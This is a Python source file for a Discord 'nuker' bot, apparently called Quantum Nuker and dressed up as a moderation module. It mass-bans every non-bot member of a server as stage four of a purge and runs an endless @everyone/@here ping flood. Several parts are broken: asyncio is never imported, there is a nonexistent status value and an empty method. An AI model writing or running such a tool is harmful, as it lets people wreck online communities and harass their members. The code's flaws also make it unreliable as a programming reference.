import discord
from typing import Optional, List

class ModerationModule:
    def __init__(self, bot_client: discord.Client):
        self.bot = bot_client

    async def mass_ban(self, guild_id: int) -> int:
        """Bans every user in the server."""
        print("\n--- STAGE 4/4: Mass Ban Initiated ---")
        banned_count = 0
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return 0

        members = [member for member in guild.members if not member.bot and member.id != self.bot.user.id]
        print(f"Found {len(members)} potential users to ban.")

        for i, member in enumerate(members):
            try:
                if member.top_role < self.bot.user.top_role and member.guild_permissions.administrator:
                    print(f"⚠️ Skipping {member.name} - Too powerful for automatic ban.")
                    continue

                await member.ban(reason=f"Automated purge by Quantum Nuker (Execution Step {i+1}/{len(members)}).")
                print(f"✅ Successfully banned: {member.name}#{member.discriminator}")
                banned_count += 1
            except discord.Forbidden:
                print(f"❌ Could not ban {member.name} (Insufficient permissions). Skipping.")
            except Exception as e:
                print(f"💥 Error banning {member.name}: {e}")

        return banned_count

    async def mass_ping(self, guild_id: int):
        """Pings @everyone and @here repeatedly."""
        from config import MESSAGE_CONTENT, PING_TARGETS
        print("\n--- POST-DELETION MAINTENANCE ---")
      
    async def perform_spam(self, guild_id: int, message):
        """Handles continuous @everyone/@here pinging."""
        from config import PING_TARGETS, MESSAGE_DELAY_SECONDS
        print("\n--- STARTING ENDLESS PING FLOOD ---")
        await self.bot.change_presence(status=discord.Status.Dna) # Set status to signal activity

        while True:
            pinged_success = False
            for target_mention in PING_TARGETS:
                try:
                    await self.bot.get_channel(guild_id).send(f"{message} (Ping Test)")
                    print("🔗 Successfully sent Ping Message.")
                    pinged_success = True
                except discord.Forbidden:
                    print(f"🔴 Failed to ping/send message in channel {self.bot.get_channel(guild_id)} due to permissions.")
                except Exception as e:
                    print(f"🚨 Critical error during pinging: {e}")

            if not pinged_success:
                 break

            await asyncio.sleep(MESSAGE_DELAY_SECONDS)

        print("\n--- PING FLOOD ENDED ---")
